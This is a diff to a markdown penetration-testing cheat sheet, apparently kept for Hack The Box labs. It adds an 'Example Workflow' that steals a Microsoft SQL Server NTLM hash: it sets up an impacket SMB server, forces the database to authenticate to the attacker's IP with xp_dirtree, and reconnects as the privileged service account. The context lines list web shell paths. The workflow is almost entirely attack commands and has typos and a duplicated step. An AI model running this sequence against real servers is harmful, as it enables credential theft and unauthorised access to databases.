@@ -402,6 +402,27 @@ C:\xampp\htdocs\shell.php
 /usr/share/nginx/html/shell.php
 ```
 
+## Example Workflow
+
+```c
+sqlcmd -S 10.129.68.230 -U htbdbuser
+# User is un-priviledged so we need to use hash stealing to catpure some
+sudo impacket-smbserver share ./ -smb2support
+
+# Then on the target machine , we need to run - make sure to change IP to attack machine ip 
+1> EXEC master..xp_dirtree '\\10.10.16.43\share\'
+2> GO
+subdirectory
+
+#Thebn we usse impacket again to connect ot it and grab hashes
+sudo impacket-smbserver share ./ -smb2support
+
+#Then we re-connect as priv user
+impacket-mssqlclient -port 1433 -target-ip 10.129.26.147 mssqlsvc@10.129.26.147 -windows-auth
+
+
+```
+
 ## Quick Reference Table
 
 | Task | MySQL | MSSQL |
